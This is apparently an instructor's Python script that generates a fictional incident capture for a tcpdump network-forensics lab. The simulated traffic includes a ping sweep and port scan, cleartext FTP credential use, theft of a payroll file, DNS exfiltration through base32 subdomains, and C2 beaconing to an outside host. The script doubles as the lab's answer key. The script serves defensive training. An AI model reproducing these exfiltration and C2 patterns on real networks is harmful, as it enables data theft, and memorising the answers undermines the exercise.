#!/usr/bin/env python3
"""
Génère capture_incident.pcap pour le lab tcpdump (420-B01-HU).
Scénario fictif : PME « Ébénisterie Gatineau » — réseau 192.168.50.0/24.
NE PAS publier ce script dans le dépôt public : il contient les réponses.
"""
import base64
import random
from scapy.all import (Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, wrpcap)

random.seed(420)

GW_MAC = "52:54:00:aa:00:01"
MACS = {
    "192.168.50.1":  GW_MAC,
    "192.168.50.10": "52:54:00:aa:00:10",   # SRV-DC01 (DNS interne)
    "192.168.50.20": "52:54:00:aa:00:20",   # SRV-FICHIERS (FTP)
    "192.168.50.21": "52:54:00:aa:00:21",   # POSTE-COMPTA
    "192.168.50.22": "52:54:00:aa:00:22",   # POSTE-RH
    "192.168.50.35": "52:54:00:aa:00:35",   # POSTE-ATELIER (compromis)
}

def mac(ip):
    return MACS.get(ip, GW_MAC)

pkts = []
T0 = 1791900000.0  # 2026-10-13 10h00 HAE
t = T0

def add(p, ts):
    p.time = ts
    pkts.append(p)

def eth(src, dst):
    return Ether(src=mac(src), dst=mac(dst))

# ---------------------------------------------------------------- DNS
def dns(client, name, answer, ts, qid=None, rtype="A"):
    qid = qid or random.randint(1, 65535)
    sport = random.randint(49152, 65535)
    q = eth(client, "192.168.50.10")/IP(src=client, dst="192.168.50.10")/UDP(sport=sport, dport=53)/DNS(id=qid, rd=1, qd=DNSQR(qname=name, qtype=rtype))
    add(q, ts)
    r = eth("192.168.50.10", client)/IP(src="192.168.50.10", dst=client)/UDP(sport=53, dport=sport)/DNS(
        id=qid, qr=1, aa=0, rd=1, ra=1, qd=DNSQR(qname=name, qtype=rtype),
        an=DNSRR(rrname=name, type=rtype, ttl=300, rdata=answer))
    add(r, ts + 0.012)

# ---------------------------------------------------------------- TCP
def tcp_session(c, s, sport, dport, exchanges, ts, rtt=0.02, close=True):
    """exchanges : liste de (sens, données) ; sens 'c' = client->serveur, 's' = serveur->client"""
    cseq, sseq = random.randint(1, 2**31), random.randint(1, 2**31)
    add(eth(c, s)/IP(src=c, dst=s)/TCP(sport=sport, dport=dport, flags="S", seq=cseq, window=64240), ts)
    ts += rtt / 2
    add(eth(s, c)/IP(src=s, dst=c)/TCP(sport=dport, dport=sport, flags="SA", seq=sseq, ack=cseq + 1, window=65160), ts)
    ts += rtt / 2
    cseq += 1; sseq += 1
    add(eth(c, s)/IP(src=c, dst=s)/TCP(sport=sport, dport=dport, flags="A", seq=cseq, ack=sseq), ts)
    for sens, data in exchanges:
        ts += 0.01
        data = data.encode() if isinstance(data, str) else data
        if sens == "c":
            add(eth(c, s)/IP(src=c, dst=s)/TCP(sport=sport, dport=dport, flags="PA", seq=cseq, ack=sseq)/Raw(data), ts)
            cseq += len(data); ts += rtt / 2
            add(eth(s, c)/IP(src=s, dst=c)/TCP(sport=dport, dport=sport, flags="A", seq=sseq, ack=cseq), ts)
        else:
            add(eth(s, c)/IP(src=s, dst=c)/TCP(sport=dport, dport=sport, flags="PA", seq=sseq, ack=cseq)/Raw(data), ts)
            sseq += len(data); ts += rtt / 2
            add(eth(c, s)/IP(src=c, dst=s)/TCP(sport=sport, dport=dport, flags="A", seq=cseq, ack=sseq), ts)
    if close:
        ts += 0.01
        add(eth(c, s)/IP(src=c, dst=s)/TCP(sport=sport, dport=dport, flags="FA", seq=cseq, ack=sseq), ts)
        ts += rtt / 2
        add(eth(s, c)/IP(src=s, dst=c)/TCP(sport=dport, dport=sport, flags="FA", seq=sseq, ack=cseq + 1), ts)
        ts += rtt / 2
        add(eth(c, s)/IP(src=c, dst=s)/TCP(sport=sport, dport=dport, flags="A", seq=cseq + 1, ack=sseq + 1), ts)
    return ts

def https_noise(c, ip, ts):
    """Session TLS opaque (on ne voit que des octets chiffrés)."""
    blob = lambda n: bytes([0x17, 0x03, 0x03]) + bytes(random.getrandbits(8) for _ in range(n))
    return tcp_session(c, ip, random.randint(49152, 65535), 443,
                       [("c", bytes([0x16, 0x03, 0x01]) + bytes(random.getrandbits(8) for _ in range(180))),
                        ("s", blob(220)), ("c", blob(90)), ("s", blob(400))], ts, rtt=0.03)

# ================================================================
# 1) Trafic normal du matin (09:00:00 -> 09:02)
# ================================================================
normal = [
    ("192.168.50.21", "outlook.office365.com", "52.96.88.130"),
    ("192.168.50.22", "www.desjardins.com", "142.250.80.4"),
    ("192.168.50.21", "www.revenuquebec.ca", "205.236.11.20"),
    ("192.168.50.22", "teams.microsoft.com", "52.113.194.132"),
    ("192.168.50.35", "www.google.ca", "142.251.41.35"),
]
for c, name, ip in normal:
    dns(c, name, ip, t); t += 0.05
    t = https_noise(c, ip, t) + random.uniform(1.5, 4)

# Mise à jour Windows en HTTP clair (bruit légitime)
dns("192.168.50.21", "ctldl.windowsupdate.com", "93.184.215.201", t); t += 0.05
t = tcp_session("192.168.50.21", "93.184.215.201", 50311, 80, [
    ("c", "GET /msdownload/update/v3/static/trustedr/en/authrootstl.cab HTTP/1.1\r\nHost: ctldl.windowsupdate.com\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n\r\n"),
    ("s", "HTTP/1.1 304 Not Modified\r\nServer: ECAcc\r\n\r\n")], t) + 3

# ================================================================
# 2) Connexion à l'intranet en HTTP clair (identifiants exposés)
# ================================================================
dns("192.168.50.22", "intranet.ebenisterie-gatineau.local", "192.168.50.10", t); t += 0.05
body = "utilisateur=mlavoie&motdepasse=Erable2026%21&valider=Connexion"
t = tcp_session("192.168.50.22", "192.168.50.10", 51022, 80, [
    ("c", "GET /connexion.php HTTP/1.1\r\nHost: intranet.ebenisterie-gatineau.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n"),
    ("s", "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 96\r\n\r\n<html><form method=post><input name=utilisateur><input name=motdepasse type=password></form></html>"),
    ("c", "POST /connexion.php HTTP/1.1\r\nHost: intranet.ebenisterie-gatineau.local\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body)),
    ("s", "HTTP/1.1 302 Found\r\nLocation: /accueil.php\r\nSet-Cookie: PHPSESSID=7f3a9c21be; HttpOnly\r\n\r\n")], t) + 5

# ================================================================
# 3) Le poste de l'atelier (.35) fait un balayage ICMP (09:03)
# ================================================================
vivants = {1, 10, 20, 21, 22}
for h in range(1, 31):
    dst = "192.168.50.%d" % h
    if h == 35:
        continue
    add(eth("192.168.50.35", dst)/IP(src="192.168.50.35", dst=dst)/ICMP(type=8, id=0x4b1d, seq=h), t)
    if h in vivants:
        add(eth(dst, "192.168.50.35")/IP(src=dst, dst="192.168.50.35")/ICMP(type=0, id=0x4b1d, seq=h), t + 0.0008)
    t += 0.02
t += 4

# ================================================================
# 4) Balayage SYN de .35 vers SRV-FICHIERS (.20)
# ================================================================
ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 1433, 3306, 3389, 5900, 8080]
ouverts = {21, 22, 139, 445, 3389}
random.shuffle(ports)
scan_sport = 61337
for p in ports:
    seq = random.randint(1, 2**31)
    add(eth("192.168.50.35", "192.168.50.20")/IP(src="192.168.50.35", dst="192.168.50.20")/TCP(sport=scan_sport, dport=p, flags="S", seq=seq, window=1024), t)
    if p in ouverts:
        add(eth("192.168.50.20", "192.168.50.35")/IP(src="192.168.50.20", dst="192.168.50.35")/TCP(sport=p, dport=scan_sport, flags="SA", seq=random.randint(1, 2**31), ack=seq + 1), t + 0.0005)
        add(eth("192.168.50.35", "192.168.50.20")/IP(src="192.168.50.35", dst="192.168.50.20")/TCP(sport=scan_sport, dport=p, flags="R", seq=seq + 1), t + 0.0009)
    else:
        add(eth("192.168.50.20", "192.168.50.35")/IP(src="192.168.50.20", dst="192.168.50.35")/TCP(sport=p, dport=scan_sport, flags="RA", seq=0, ack=seq + 1), t + 0.0005)
    t += 0.003
t += 6

# ================================================================
# 5) Connexion FTP en clair et vol d'un fichier
# ================================================================
t = tcp_session("192.168.50.35", "192.168.50.20", 52100, 21, [
    ("s", "220 SRV-FICHIERS FTP pret\r\n"),
    ("c", "USER sauvegarde\r\n"),
    ("s", "331 Mot de passe requis pour sauvegarde\r\n"),
    ("c", "PASS Bkp!Atelier99\r\n"),
    ("s", "230 Utilisateur connecte\r\n"),
    ("c", "PASV\r\n"),
    ("s", "227 Entering Passive Mode (192,168,50,20,195,81)\r\n"),
    ("c", "RETR paie_2026_T3.xlsx\r\n"),
    ("s", "150 Ouverture de la connexion de donnees\r\n"),
    ("s", "226 Transfert termine\r\n"),
    ("c", "QUIT\r\n"),
    ("s", "221 Au revoir\r\n")], t)
# canal de données (port 195*256+81 = 50001)
t = tcp_session("192.168.50.35", "192.168.50.20", 52101, 50001,
                [("s", b"PK\x03\x04" + bytes(random.getrandbits(8) for _ in range(900)))], t - 0.3) + 8

# ================================================================
# 6) Exfiltration par DNS (sous-domaines encodés en base32)
# ================================================================
secret = b"FLAG{dns-exfil-paie-T3}"
enc = base64.b32encode(secret).decode().rstrip("=").lower()
morceaux = [enc[i:i + 10] for i in range(0, len(enc), 10)]
for i, m in enumerate(morceaux):
    dns("192.168.50.35", "%d-%s.cdn-maj-update.net" % (i, m), "198.51.100.66", t, rtype="A")
    t += 1.7
t += 3

# ================================================================
# 7) Balise C2 HTTP toutes les ~30 s (beaconing) + trafic normal entremêlé
# ================================================================
dns("192.168.50.35", "cdn-maj-update.net", "198.51.100.66", t); t += 0.05
for i in range(8):
    t_beacon = t
    tcp_session("192.168.50.35", "198.51.100.66", 53000 + i, 8080, [
        ("c", "GET /maj/check?id=ATELIER-35&n=%d HTTP/1.1\r\nHost: cdn-maj-update.net:8080\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n\r\n" % i),
        ("s", "HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\nNOOP" if i != 5 else "HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nCMD:whoami")], t_beacon)
    # bruit légitime entre deux balises
    c = random.choice(["192.168.50.21", "192.168.50.22"])
    name, ip = random.choice(normal)[1:]
    dns(c, name, ip, t + 8)
    https_noise(c, ip, t + 8.1)
    t += 30 + random.uniform(-0.4, 0.4)

pkts.sort(key=lambda p: p.time)
wrpcap("/home/claude/lab-tcpdump/capture_incident.pcap", pkts)
print("Paquets écrits :", len(pkts))
